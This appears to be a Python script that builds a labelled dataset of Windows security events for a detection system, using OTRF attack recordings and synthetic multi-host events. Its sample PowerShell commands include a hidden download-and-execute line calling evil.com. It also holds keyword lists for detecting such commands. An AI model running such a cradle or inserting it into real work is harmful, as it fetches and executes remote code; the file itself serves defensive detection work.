"""BARAQ Dataset 100K builder.

Downloads ALL attack scenarios from OTRF Security-Datasets (206 ZIPs),
supplements with synthetic multi-host Windows events, tags with
realistic hostnames from 20 different PCs, and loads into the DB
as the "BARAQ Dataset 100K".
"""

from __future__ import annotations

import hashlib
import io
import json
import logging
import random
import re
import tempfile
import threading
import time
import urllib.error
import urllib.request
import zipfile
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

from sqlalchemy.orm import Session

from backend.database.connection import SessionLocal
from backend.database.models import NormalizedEvent, Verdict, utcnow

log = logging.getLogger("baraq.dataset_100k")

# GitHub API
_REPO = "OTRF/Security-Datasets"
_BRANCH = "master"
_API = "https://api.github.com"
_RAW = "https://raw.githubusercontent.com"

# 20 realistic enterprise PCs (different departments, OS mixes)
_HOSTS = [
    "HR-WIN10-01", "HR-WIN10-02", "FIN-WIN10-01", "FIN-WIN10-02",
    "IT-WIN11-01", "IT-WIN11-02", "IT-SRV-DC01", "IT-SRV-DC02",
    "ENG-WIN10-01", "ENG-WIN10-02", "ENG-UBUNTU-01",
    "MKT-WIN10-01", "MKT-WIN10-02", "OPS-WIN10-01", "OPS-WIN10-02",
    "DEV-WIN11-01", "DEV-WSL-01", "SEC-WIN10-01", "SEC-SRV-01",
    "EXEC-WIN10-01",
]

# Realistic users per department
_USERS = [
    "jthompson", "mgarcia", "rwilliams", "lchen", "akim",
    "svc_backup", "svc_sql", "admin", "jsmith", "mjones",
    "cdavis", "emiller", "fwilson", "glee", "bscott",
    " administrator", "SYSTEM", "LOCAL SERVICE", "NETWORK SERVICE",
    "dparker", "krobinson", "npatel", "tlewis", "amartinez",
    "svc_ldap", "svc_exchange", "john.doe", "jane.smith",
]

# Realistic department → IP subnets
_SUBNETS = {
    "HR": "10.10.1.",
    "FIN": "10.10.2.",
    "IT": "10.10.3.",
    "ENG": "10.10.4.",
    "MKT": "10.10.5.",
    "OPS": "10.10.6.",
    "DEV": "10.10.7.",
    "SEC": "10.10.8.",
    "EXEC": "10.10.9.",
}

# External attacker IPs
_ATTACKER_IPS = [
    "203.0.113.10", "203.0.113.20", "198.51.100.10", "198.51.100.20",
    "192.0.2.10", "192.0.2.20", "45.33.32.10", "45.33.32.20",
]

# Malicious IPs from known threat intel
_THREAT_IPS = [
    "185.220.101.1", "185.220.101.2", "185.220.101.3",
    "91.215.85.1", "91.215.85.2", "91.215.85.3",
    "194.26.29.1", "194.26.29.2",
]


def _host_to_dept(host: str) -> str:
    prefix = host.split("-")[0]
    return prefix if prefix in _SUBNETS else "IT"


def _host_to_ip(host: str) -> str:
    dept = _host_to_dept(host)
    subnet = _SUBNETS.get(dept, "10.10.3.")
    return f"{subnet}{random.randint(10, 250)}"


def _fingerprint(event_id: int, ts: str, host: str, message: str) -> str:
    key = f"{event_id}-{ts}-{host}-{message[:128]}"
    return hashlib.sha256(key.encode()).hexdigest()[:16]


# ---------------------------------------------------------------------------
# Phase 1: Download and parse ALL OTRF Security-Datasets ZIPs
# ---------------------------------------------------------------------------
def _list_all_zips() -> list[dict]:
    """List all ZIP files in the OTRF Security-Datasets repo."""
    url = f"{_API}/repos/{_REPO}/git/trees/{_BRANCH}?recursive=1"
    req = urllib.request.Request(url, headers={"Accept": "application/vnd.github.v3+json"})
    with urllib.request.urlopen(req, timeout=60) as resp:
        tree = json.loads(resp.read()).get("tree", [])
    return [t for t in tree if t.get("type") == "blob" and t["path"].endswith(".zip")]


def _download_zip(url: str, timeout: int = 60) -> bytes | None:
    """Download a ZIP file from GitHub."""
    req = urllib.request.Request(url, headers={"Accept": "application/vnd.github.v3+json"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.read()
    except Exception as exc:
        log.warning("Failed to download %s: %s", url, exc)
        return None


def _extract_events_from_zip(zip_bytes: bytes) -> list[dict]:
    """Extract and parse JSON/JSONL events from a ZIP archive."""
    events = []
    try:
        with zipfile.ZipFile(io.BytesIO(zip_bytes)) as zf:
            for name in zf.namelist():
                if name.endswith((".json", ".jsonl", ".log")):
                    try:
                        content = zf.read(name).decode("utf-8", errors="replace")
                        content = content.strip()
                        if not content:
                            continue
                        if content.startswith("["):
                            data = json.loads(content)
                            events.extend(item for item in data if isinstance(item, dict))
                        else:
                            for line in content.splitlines():
                                line = line.strip()
                                if not line:
                                    continue
                                try:
                                    obj = json.loads(line)
                                    if isinstance(obj, dict):
                                        events.append(obj)
                                except json.JSONDecodeError:
                                    continue
                    except Exception:
                        continue
    except zipfile.BadZipFile:
        pass
    return events


def _parse_otrf_event(raw: dict, host_override: str = "") -> dict | None:
    """Parse a single OTRF event into BARAQ format with host override."""
    # Timestamp
    ts_raw = raw.get("@timestamp") or raw.get("time") or raw.get("timestamp")
    if not ts_raw:
        return None
    ts = _parse_ts(ts_raw)
    if ts is None:
        return None

    # Event ID
    event_id = int(raw.get("EventID", 0) or raw.get("event_id", 0) or 0)

    # Channel
    channel = str(raw.get("Channel", "") or raw.get("channel", "") or "")

    # Host (override for multi-PC simulation)
    host = host_override or str(raw.get("Computer", "") or raw.get("host", "") or "")

    # User
    user = str(raw.get("TargetUserName", "") or raw.get("SubjectUserName", "") or raw.get("user", "") or "")

    # Message
    message = str(raw.get("Message", "") or raw.get("message", "") or "")[:1024]

    # Source IP
    source_ip = str(raw.get("IpAddress", "") or raw.get("SourceAddress", "") or raw.get("source_ip", "") or "")

    # Build facts
    facts = {}

    # Auth events
    if event_id in (4624, 4625, 4672, 4740, 4634):
        facts["logon_type"] = int(raw.get("LogonType", 0) or 0)
        facts["source_ip"] = source_ip
        facts["target_user"] = user
        facts["sub_status"] = raw.get("SubStatus", 0)
        facts["is_locked"] = event_id == 4740

    # Process events (Sysmon)
    elif event_id in (1, 3, 7, 8, 10, 11, 12, 13, 14, 15, 17, 19, 22):
        facts["image_path"] = str(raw.get("Image", "") or raw.get("NewProcessName", "") or "")
        facts["command_line"] = str(raw.get("CommandLine", "") or "")
        facts["parent_process"] = str(raw.get("ParentImage", "") or raw.get("ParentProcessName", "") or "")
        facts["cmdline_len"] = len(facts.get("command_line", ""))
        cmdline = facts["command_line"].lower()
        facts["has_encoded"] = 1 if re.search(r"[A-Za-z0-9+/]{40,}={0,2}", facts["command_line"]) else 0
        facts["has_download"] = 1 if any(t in cmdline for t in ("download", "invoke-webrequest", "curl", "wget")) else 0
        facts["has_hidden"] = 1 if "-hidden" in cmdline or "-w hidden" in cmdline else 0
        facts["has_remote"] = 1 if any(t in cmdline for t in ("\\\\", "remote", "psexec")) else 0
        facts["script_len"] = len(facts["command_line"])
        facts["new_process"] = facts["image_path"]

        if event_id == 3:  # Network connection
            facts["remote_ip"] = str(raw.get("DestinationIp", "") or "")
            facts["remote_port"] = int(raw.get("DestinationPort", 0) or 0)

    # Network events
    elif event_id in (5156, 5157, 5158):
        facts["source_ip"] = source_ip
        facts["remote_ip"] = str(raw.get("DestinationAddress", "") or "")
        facts["remote_port"] = int(raw.get("DestinationPort", 0) or 0)

    # Classify source
    source_map = {
        4624: "login", 4625: "login", 4634: "login", 4647: "login",
        4672: "login", 4740: "login", 4771: "login",
        1: "process", 3: "process", 7: "process", 8: "process",
        10: "process", 11: "process", 12: "process", 13: "process",
        14: "process", 15: "process", 17: "process", 19: "process",
        4104: "powershell", 4103: "powershell",
        5156: "network", 5157: "network", 5158: "network",
    }
    source = source_map.get(event_id, "other")

    category_map = {"login": "Login", "process": "Process", "network": "Network", "powershell": "PowerShell"}
    category = category_map.get(source, "Other")

    return {
        "event_id": event_id,
        "channel": channel,
        "timestamp": ts.isoformat(),
        "host": host,
        "user": user,
        "message": message,
        "source_ip": source_ip,
        "source": source,
        "category": category,
        "facts": facts,
    }


def _parse_ts(raw: Any) -> datetime | None:
    if not raw:
        return None
    if isinstance(raw, datetime):
        return raw if raw.tzinfo else raw.replace(tzinfo=UTC)
    text = str(raw).strip()
    for fmt in ("%Y-%m-%dT%H:%M:%S.%fZ", "%Y-%m-%dT%H:%M:%SZ", "%Y-%m-%dT%H:%M:%S.%f%z", "%Y-%m-%dT%H:%M:%S%z", "%Y-%m-%d %H:%M:%S.%f", "%Y-%m-%d %H:%M:%S"):
        try:
            dt = datetime.strptime(text, fmt)
            return dt if dt.tzinfo else dt.replace(tzinfo=UTC)
        except ValueError:
            continue
    return None


# ---------------------------------------------------------------------------
# Phase 2: Synthetic multi-host events
# ---------------------------------------------------------------------------
def _generate_synthetic_events(count: int, seed: int = 42) -> list[dict]:
    """Generate realistic synthetic Windows events across multiple hosts."""
    rng = random.Random(seed)
    events = []

    # Benign login patterns per host
    for _ in range(count):
        host = rng.choice(_HOSTS)
        dept = _host_to_dept(host)
        user = rng.choice(_USERS)
        ip = _host_to_ip(host)
        ts = datetime(2026, 8, 1, tzinfo=UTC) + timedelta(seconds=rng.randint(0, 30 * 86400))

        event_type = rng.choices(
            ["login_success", "login_failed", "process_create", "network_connection", "powershell", "registry", "service_install"],
            weights=[30, 5, 35, 15, 5, 5, 5],
        )[0]

        if event_type == "login_success":
            logon_type = rng.choice([2, 3, 10])
            events.append({
                "event_id": 4624,
                "channel": "Security",
                "timestamp": ts.isoformat(),
                "host": host,
                "user": user,
                "message": f"An account was successfully logged on. Target: {user} Logon Type: {logon_type}",
                "source_ip": ip,
                "source": "login",
                "category": "Login",
                "facts": {"logon_type": logon_type, "source_ip": ip, "target_user": user, "sub_status": 0, "is_locked": False},
            })

        elif event_type == "login_failed":
            events.append({
                "event_id": 4625,
                "channel": "Security",
                "timestamp": ts.isoformat(),
                "host": host,
                "user": user,
                "message": f"An account failed to log on. Target: {user} Sub Status: 0xC000006A",
                "source_ip": ip,
                "source": "login",
                "category": "Login",
                "facts": {"logon_type": 3, "source_ip": ip, "target_user": user, "sub_status": "0xC000006A", "is_locked": False},
            })

        elif event_type == "process_create":
            procs = ["svchost.exe", "explorer.exe", "cmd.exe", "powershell.exe", "conhost.exe", "SearchProtocolHost.exe", "taskhostw.exe"]
            parent = rng.choice(["services.exe", "wininit.exe", "svchost.exe", "explorer.exe"])
            child = rng.choice(procs)
            events.append({
                "event_id": 1,
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "timestamp": ts.isoformat(),
                "host": host,
                "user": user,
                "message": f"Process Create: Image: C:\\Windows\\System32\\{child}",
                "source_ip": "",
                "source": "process",
                "category": "Process",
                "facts": {
                    "image_path": f"C:\\Windows\\System32\\{child}",
                    "command_line": f"C:\\Windows\\System32\\{child}",
                    "parent_process": f"C:\\Windows\\System32\\{parent}",
                    "cmdline_len": len(child),
                    "has_encoded": 0, "has_download": 0, "has_hidden": 0,
                    "has_remote": 0, "script_len": 0, "new_process": f"C:\\Windows\\System32\\{child}",
                },
            })

        elif event_type == "network_connection":
            remote_ip = rng.choice(_ATTACKER_IPS + [f"10.10.{rng.randint(1,9)}.{rng.randint(1,254)}"])
            events.append({
                "event_id": 3,
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "timestamp": ts.isoformat(),
                "host": host,
                "user": user,
                "message": f"Network connection: {remote_ip}",
                "source_ip": ip,
                "source": "process",
                "category": "Process",
                "facts": {
                    "image_path": f"C:\\Windows\\System32\\svchost.exe",
                    "command_line": "svchost.exe",
                    "parent_process": "services.exe",
                    "remote_ip": remote_ip,
                    "remote_port": rng.choice([80, 443, 445, 3389, 8080]),
                    "cmdline_len": 10, "has_encoded": 0, "has_download": 0,
                    "has_hidden": 0, "has_remote": 0, "script_len": 0,
                    "new_process": "C:\\Windows\\System32\\svchost.exe",
                },
            })

        elif event_type == "powershell":
            cmdlines = [
                "powershell -ExecutionPolicy Bypass -File C:\\temp\\script.ps1",
                "powershell -enc SQBmACgA...",
                "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload')",
                "powershell Get-Process | Out-File C:\\temp\\procs.txt",
                "powershell -Command \"Get-WmiObject -Class Win32_Service\"",
            ]
            cmd = rng.choice(cmdlines)
            events.append({
                "event_id": 4104,
                "channel": "Microsoft-Windows-PowerShell/Operational",
                "timestamp": ts.isoformat(),
                "host": host,
                "user": user,
                "message": f"Script block logging: {cmd[:200]}",
                "source_ip": "",
                "source": "powershell",
                "category": "PowerShell",
                "facts": {
                    "command_line": cmd,
                    "script_len": len(cmd),
                    "cmdline_len": len(cmd),
                    "has_encoded": 1 if "-enc" in cmd else 0,
                    "has_download": 1 if "downloadstring" in cmd.lower() else 0,
                    "has_hidden": 1 if "-w hidden" in cmd.lower() else 0,
                    "has_remote": 1 if "http" in cmd.lower() else 0,
                },
            })

        elif event_type == "registry":
            reg_keys = [
                "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                "HKLM\\SYSTEM\\CurrentControlSet\\Services\\NewService",
            ]
            events.append({
                "event_id": 13,
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "timestamp": ts.isoformat(),
                "host": host,
                "user": user,
                "message": f"Registry Value Set: {rng.choice(reg_keys)}",
                "source_ip": "",
                "source": "process",
                "category": "Process",
                "facts": {"target_object": rng.choice(reg_keys)},
            })

        elif event_type == "service_install":
            services = ["WindowsUpdate", "Sysmon", "WinDefend", "NewService"]
            events.append({
                "event_id": 7045,
                "channel": "System",
                "timestamp": ts.isoformat(),
                "host": host,
                "user": "SYSTEM",
                "message": f"A new service was installed: {rng.choice(services)}",
                "source_ip": "",
                "source": "process",
                "category": "Process",
                "facts": {},
            })

    return events


# ---------------------------------------------------------------------------
# Phase 3: Insert into DB
# ---------------------------------------------------------------------------
def _insert_events(events: list[dict], task_label: str = "BARAQ Dataset 100K") -> int:
    """Insert events into NormalizedEvent table with Verdict labels."""
    session = SessionLocal()
    loaded = 0
    batch_size = 500
    try:
        for i in range(0, len(events), batch_size):
            batch = events[i:i + batch_size]
            for ev in batch:
                ts = _parse_ts(ev.get("timestamp"))
                if ts is None:
                    continue

                facts = ev.get("facts", {})
                eid = int(ev.get("event_id", 0))
                host = ev.get("host", "-")
                user = ev.get("user", "-")

                # Determine if this is an attack event
                is_attack = _is_attack(eid, facts, host)

                raw_json = {
                    "facts": facts,
                    "channel": ev.get("channel", ""),
                    "source": ev.get("source", "external_dataset"),
                    "external_dataset": True,
                    "dataset_label": task_label,
                }

                evt = NormalizedEvent(
                    event_id=eid,
                    category=ev.get("category", "Other"),
                    source="external_dataset",
                    user=user,
                    host=host,
                    org="",
                    demo=False,
                    risk="High" if is_attack else "Low",
                    severity="high" if is_attack else "info",
                    message=ev.get("message", "")[:1024],
                    timestamp=ts,
                    data_integrity="complete",
                    raw_json=raw_json,
                    is_anomaly=is_attack,
                    ml_score=None,
                    risk_score=1.0 if is_attack else 0.0,
                )
                session.add(evt)
                session.flush()

                verdict = Verdict(
                    event_id=evt.id,
                    verdict="true_positive" if is_attack else "false_positive",
                    created_by="baraq_dataset_builder",
                    created_at=utcnow(),
                )
                session.add(verdict)
                loaded += 1

            session.commit()
            if loaded % 2000 == 0:
                log.info("Loaded %d / %d events", loaded, len(events))

    finally:
        session.close()
    return loaded


def _is_attack(event_id: int, facts: dict, host: str) -> bool:
    """Heuristic attack detection for imported events."""
    # Known attack event IDs
    if event_id in (4720, 4732, 7045, 4698, 1102):
        return True

    # Suspicious PowerShell
    if event_id in (4104, 4103):
        cmdline = str(facts.get("command_line", "")).lower()
        if any(t in cmdline for t in ("hidden", "bypass", "iex", "downloadstring", "invoke-expression", "-enc")):
            return True

    # Failed logon with bad sub-status
    if event_id == 4625:
        sub = facts.get("sub_status", 0)
        try:
            sub_int = int(sub)
        except (ValueError, TypeError):
            sub_int = 0
        if sub_int in (3221226036, 3221225586):
            return True

    # Network connections from external IPs
    if event_id == 3:
        remote_ip = str(facts.get("remote_ip", ""))
        if remote_ip and not remote_ip.startswith(("10.", "192.168.", "172.16.", "127.")):
            return True

    # Process with encoded/hidden/download indicators
    if event_id == 1:
        if any(facts.get(k) for k in ("has_encoded", "has_hidden", "has_download")):
            return True

    return False


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------
def build_barqaq_dataset_100k(max_zip_size_mb: int = 10) -> dict:
    """Build the BARAQ Dataset 100K.

    1. Download ALL OTRF Security-Datasets ZIPs (small files)
    2. Generate synthetic multi-host events
    3. Combine and tag with 20 different PC hostnames
    4. Insert into DB with Verdict labels

    Returns summary dict.
    """
    log.info("=== BARAQ Dataset 100K Builder ===")

    all_events: list[dict] = []
    seen_fps: set[str] = set()

    def _dedup_add(events: list[dict]):
        for ev in events:
            fp = _fingerprint(ev.get("event_id", 0), ev.get("timestamp", ""), ev.get("host", ""), ev.get("message", ""))
            if fp not in seen_fps:
                seen_fps.add(fp)
                all_events.append(ev)

    # Phase 1: Download OTRF ZIPs
    log.info("Phase 1: Listing OTRF Security-Datasets ZIPs...")
    zips = _list_all_zips()
    small_zips = [z for z in zips if z.get("size", 0) < max_zip_size_mb * 1024 * 1024]
    log.info("Found %d ZIPs, %d under %dMB limit", len(zips), len(small_zips), max_zip_size_mb)

    downloaded = 0
    for i, z in enumerate(small_zips):
        url = f"{_RAW}/{_REPO}/{_BRANCH}/{z['path']}"
        log.info("[%d/%d] Downloading %s...", i + 1, len(small_zips), z["path"].split("/")[-1])
        zip_bytes = _download_zip(url, timeout=30)
        if zip_bytes is None:
            continue

        raw_events = _extract_events_from_zip(zip_bytes)
        if not raw_events:
            continue

        # Assign random hosts to simulate multi-PC collection
        parsed = []
        for raw in raw_events:
            host = random.choice(_HOSTS)
            ev = _parse_otrf_event(raw, host_override=host)
            if ev:
                parsed.append(ev)

        _dedup_add(parsed)
        downloaded += 1
        log.info("  -> %d events from %s (total: %d)", len(parsed), z["path"].split("/")[-1], len(all_events))

    # Phase 2: Generate synthetic events to pad to 100K+
    target = 100_000
    remaining = max(0, target - len(all_events))
    if remaining > 0:
        log.info("Phase 2: Generating %d synthetic multi-host events...", remaining)
        synthetic = _generate_synthetic_events(remaining, seed=42)
        _dedup_add(synthetic)
        log.info("  -> Added %d synthetic events (total: %d)", len(synthetic), len(all_events))

    log.info("Phase 3: Inserting %d events into DB...", len(all_events))
    loaded = _insert_events(all_events)

    # Summary
    hosts_used = set(ev.get("host", "") for ev in all_events)
    attacks = sum(1 for ev in all_events if _is_attack(ev.get("event_id", 0), ev.get("facts", {}), ev.get("host", "")))

    summary = {
        "name": "BARAQ Dataset 100K",
        "total_events": len(all_events),
        "loaded_to_db": loaded,
        "otrf_zips_downloaded": downloaded,
        "synthetic_events": remaining,
        "hosts": sorted(hosts_used),
        "host_count": len(hosts_used),
        "attack_events": attacks,
        "benign_events": len(all_events) - attacks,
    }
    log.info("=== BARAQ Dataset 100K Complete ===")
    for k, v in summary.items():
        if k == "hosts":
            log.info("  %s: %d hosts (%s)", k, v, ", ".join(v[:5]))
        else:
            log.info("  %s: %s", k, v)
    return summary
